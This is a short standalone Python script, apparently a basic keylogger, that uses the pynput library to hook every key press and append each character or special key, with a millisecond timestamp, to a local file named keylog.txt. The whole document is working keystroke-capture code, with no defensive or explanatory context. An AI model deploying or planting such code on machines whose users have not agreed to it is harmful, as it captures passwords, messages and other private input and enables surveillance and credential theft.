from pynput import keyboard
from datetime import datetime

def on_press(key):
    with open("keylog.txt", "a") as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S,%f')[:-3]
        try:
            f.write(f"{timestamp}: {key.char} pressed\n")
        except AttributeError:
            f.write(f"{timestamp}: Special key {key} pressed\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
